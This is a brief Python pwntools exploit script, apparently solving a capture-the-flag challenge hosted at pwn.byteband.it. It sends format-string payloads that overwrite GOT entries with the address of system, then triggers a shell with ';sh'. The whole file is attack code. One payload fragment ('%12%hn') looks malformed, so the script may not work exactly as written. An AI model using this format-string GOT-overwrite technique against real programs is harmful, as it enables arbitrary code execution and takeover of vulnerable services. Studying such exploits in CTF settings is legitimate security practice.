from pwn import *

#io = process("./fmt")

io = remote("pwn.byteband.it",6969)
io.sendlineafter("Choice: ","2")
io.recvuntil("Good job. I'll give you a gift.")

system_got = 0x404028

sngot =0x404058

system = 0x0000000000401050

payload = "%4198592x"+"%11$naa" +"%4294967190x" + "%12%hnaaaaaa" +p64(system_got) + p64(sngot)

io.sendline(payload)
io.sendlineafter("Choice: ","2")
io.recvuntil("Good job. I'll give you a gift.")


payload = "%9$naaaa"+"%4198480x"+"%10$naa" + p64(sngot+4) + p64(sngot)

io.sendline(payload)
#gdb.attach(io)
io.sendlineafter("Choice: ",";sh\x00")

io.interactive()
